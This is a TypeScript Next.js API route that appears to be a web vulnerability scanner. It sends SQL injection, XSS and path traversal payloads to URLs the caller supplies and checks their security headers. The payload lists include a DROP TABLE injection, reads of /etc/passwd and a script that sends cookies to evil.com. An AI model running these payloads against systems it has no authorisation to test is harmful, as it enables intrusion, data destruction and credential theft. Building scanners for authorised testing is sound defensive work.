import { type NextRequest, NextResponse } from "next/server"

interface VulnerabilityResult {
  endpoint: string
  vulnerabilities: {
    type: "SQL_INJECTION" | "XSS" | "CSRF" | "HEADER_SECURITY" | "INFORMATION_DISCLOSURE" | "AUTHENTICATION"
    severity: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW"
    description: string
    payload?: string
    evidence?: string
    recommendation: string
    cvss?: number
  }[]
  responseTime: number
  status: number
  notes: string[]
}

// Advanced payload sets with encoding variations
const sqlPayloads = [
  "' OR '1'='1",
  '" OR "1"="1',
  "' OR 1=1 --",
  "' UNION SELECT NULL--",
  "' AND (SELECT COUNT(*) FROM users) > 0--",
  "' OR SLEEP(5)--",
  "'; DROP TABLE users--",
  "' OR 1=1#",
  "%27%20OR%20%271%27%3D%271", // URL encoded
  "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
]

const xssPayloads = [
  "<script>alert('XSS')</script>",
  '"><img src=x onerror=alert(1)>',
  "<svg/onload=alert(1)>",
  "javascript:alert('XSS')",
  "<iframe src=\"javascript:alert('XSS')\"></iframe>",
  "<body onload=alert('XSS')>",
  "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E", // URL encoded
  '<img src="x" onerror="alert(\'XSS\')">',
  "';alert('XSS');//",
  "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
]

const directoryTraversalPayloads = [
  "../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "....//....//....//etc/passwd",
  "../../../proc/version",
]

async function testSQLInjection(url: string): Promise<any[]> {
  const vulnerabilities = []

  for (const payload of sqlPayloads) {
    try {
      const testUrl = new URL(url)
      testUrl.searchParams.set("id", payload)

      const startTime = Date.now()
      const response = await fetch(testUrl.toString(), {
        method: "GET",
        headers: { "User-Agent": "BugHunter-Pro-Scanner/1.0" },
      })
      const responseTime = Date.now() - startTime
      const text = await response.text()

      // Check for SQL error patterns
      const sqlErrorPatterns = [
        /SQL syntax.*MySQL/i,
        /Warning.*mysql_/i,
        /valid MySQL result/i,
        /PostgreSQL.*ERROR/i,
        /Warning.*pg_/i,
        /valid PostgreSQL result/i,
        /Microsoft.*ODBC.*SQL Server/i,
        /ORA-\d{5}/i,
        /Oracle error/i,
        /SQLite.*error/i,
        /sqlite3.OperationalError/i,
      ]

      const hasError = sqlErrorPatterns.some((pattern) => pattern.test(text))
      const hasTimeDelay = responseTime > 4000 && payload.includes("SLEEP")

      if (hasError || hasTimeDelay) {
        vulnerabilities.push({
          type: "SQL_INJECTION",
          severity: "CRITICAL",
          description: hasTimeDelay ? "Time-based SQL injection detected" : "Error-based SQL injection detected",
          payload,
          evidence: hasError ? text.substring(0, 200) : `Response time: ${responseTime}ms`,
          recommendation: "Use parameterized queries and input validation",
          cvss: 9.1,
        })
        break // Found vulnerability, no need to test more payloads
      }
    } catch (error) {
      // Network error, continue with next payload
    }
  }

  return vulnerabilities
}

async function testXSS(url: string): Promise<any[]> {
  const vulnerabilities = []

  for (const payload of xssPayloads) {
    try {
      const testUrl = new URL(url)
      testUrl.searchParams.set("q", payload)

      const response = await fetch(testUrl.toString(), {
        method: "GET",
        headers: { "User-Agent": "BugHunter-Pro-Scanner/1.0" },
      })
      const text = await response.text()

      // Check if payload is reflected in response
      if (text.includes(payload) || text.includes(decodeURIComponent(payload))) {
        vulnerabilities.push({
          type: "XSS",
          severity: "HIGH",
          description: "Reflected Cross-Site Scripting (XSS) vulnerability detected",
          payload,
          evidence: `Payload reflected in response`,
          recommendation: "Implement proper input validation and output encoding",
          cvss: 7.2,
        })
        break
      }
    } catch (error) {
      // Continue with next payload
    }
  }

  return vulnerabilities
}

async function testDirectoryTraversal(url: string): Promise<any[]> {
  const vulnerabilities = []

  for (const payload of directoryTraversalPayloads) {
    try {
      const testUrl = new URL(url)
      testUrl.searchParams.set("file", payload)

      const response = await fetch(testUrl.toString(), {
        method: "GET",
        headers: { "User-Agent": "BugHunter-Pro-Scanner/1.0" },
      })
      const text = await response.text()

      // Check for system file contents
      const systemFilePatterns = [
        /root:.*:0:0:/i, // /etc/passwd
        /\[boot loader\]/i, // Windows boot.ini
        /# Copyright.*Microsoft Corp/i, // Windows hosts file
        /Linux version \d+\.\d+/i, // /proc/version
      ]

      if (systemFilePatterns.some((pattern) => pattern.test(text))) {
        vulnerabilities.push({
          type: "INFORMATION_DISCLOSURE",
          severity: "HIGH",
          description: "Directory traversal vulnerability detected",
          payload,
          evidence: text.substring(0, 100),
          recommendation: "Implement proper file path validation and access controls",
          cvss: 7.5,
        })
        break
      }
    } catch (error) {
      // Continue with next payload
    }
  }

  return vulnerabilities
}

async function checkSecurityHeaders(url: string): Promise<any[]> {
  const vulnerabilities = []

  try {
    const response = await fetch(url, {
      method: "GET",
      headers: { "User-Agent": "BugHunter-Pro-Scanner/1.0" },
    })

    const securityHeaders = {
      "X-Frame-Options": "Clickjacking protection",
      "X-Content-Type-Options": "MIME type sniffing protection",
      "Strict-Transport-Security": "HTTPS enforcement",
      "Content-Security-Policy": "XSS and injection protection",
      "X-XSS-Protection": "XSS filtering",
      "Referrer-Policy": "Information leakage protection",
    }

    Object.entries(securityHeaders).forEach(([header, description]) => {
      if (!response.headers.get(header)) {
        vulnerabilities.push({
          type: "HEADER_SECURITY",
          severity: header === "Content-Security-Policy" ? "HIGH" : "MEDIUM",
          description: `Missing security header: ${header}`,
          recommendation: `Implement ${header} header for ${description}`,
          cvss: header === "Content-Security-Policy" ? 6.1 : 4.3,
        })
      }
    })

    // Check for information disclosure in headers
    const serverHeader = response.headers.get("Server")
    const poweredBy = response.headers.get("X-Powered-By")

    if (serverHeader && serverHeader.includes("/")) {
      vulnerabilities.push({
        type: "INFORMATION_DISCLOSURE",
        severity: "LOW",
        description: "Server version information disclosed",
        evidence: `Server: ${serverHeader}`,
        recommendation: "Remove or obfuscate server version information",
        cvss: 3.1,
      })
    }

    if (poweredBy) {
      vulnerabilities.push({
        type: "INFORMATION_DISCLOSURE",
        severity: "LOW",
        description: "Technology stack information disclosed",
        evidence: `X-Powered-By: ${poweredBy}`,
        recommendation: "Remove X-Powered-By header",
        cvss: 3.1,
      })
    }
  } catch (error) {
    // Handle error
  }

  return vulnerabilities
}

async function comprehensiveVulnScan(endpoint: string): Promise<VulnerabilityResult> {
  const startTime = Date.now()
  const notes: string[] = []
  let status = 0

  try {
    // Basic connectivity test
    const response = await fetch(endpoint, {
      method: "HEAD",
      headers: { "User-Agent": "BugHunter-Pro-Scanner/1.0" },
    })
    status = response.status
  } catch (error) {
    notes.push(`Connection failed: ${error}`)
    status = 0
  }

  // Run all vulnerability tests
  const [sqlVulns, xssVulns, dirVulns, headerVulns] = await Promise.all([
    testSQLInjection(endpoint),
    testXSS(endpoint),
    testDirectoryTraversal(endpoint),
    checkSecurityHeaders(endpoint),
  ])

  const allVulnerabilities = [...sqlVulns, ...xssVulns, ...dirVulns, ...headerVulns]
  const responseTime = Date.now() - startTime

  return {
    endpoint,
    vulnerabilities: allVulnerabilities,
    responseTime,
    status,
    notes,
  }
}

export async function POST(request: NextRequest) {
  try {
    const { endpoints } = await request.json()

    if (!endpoints || !Array.isArray(endpoints)) {
      return NextResponse.json({ error: "Endpoints array is required" }, { status: 400 })
    }

    // Limit concurrent scans to prevent overwhelming target
    const results: VulnerabilityResult[] = []
    const batchSize = 3

    for (let i = 0; i < endpoints.length; i += batchSize) {
      const batch = endpoints.slice(i, i + batchSize)
      const batchResults = await Promise.all(batch.map((endpoint: string) => comprehensiveVulnScan(endpoint)))
      results.push(...batchResults)

      // Add delay between batches
      if (i + batchSize < endpoints.length) {
        await new Promise((resolve) => setTimeout(resolve, 2000))
      }
    }

    // Generate summary
    const summary = {
      totalEndpoints: results.length,
      vulnerableEndpoints: results.filter((r) => r.vulnerabilities.length > 0).length,
      totalVulnerabilities: results.reduce((sum, r) => sum + r.vulnerabilities.length, 0),
      criticalVulns: results.reduce(
        (sum, r) => sum + r.vulnerabilities.filter((v) => v.severity === "CRITICAL").length,
        0,
      ),
      highVulns: results.reduce((sum, r) => sum + r.vulnerabilities.filter((v) => v.severity === "HIGH").length, 0),
      mediumVulns: results.reduce((sum, r) => sum + r.vulnerabilities.filter((v) => v.severity === "MEDIUM").length, 0),
      lowVulns: results.reduce((sum, r) => sum + r.vulnerabilities.filter((v) => v.severity === "LOW").length, 0),
    }

    return NextResponse.json({
      summary,
      results,
      timestamp: new Date().toISOString(),
    })
  } catch (error) {
    console.error("Advanced vulnerability scan error:", error)
    return NextResponse.json({ error: "Vulnerability scan failed" }, { status: 500 })
  }
}
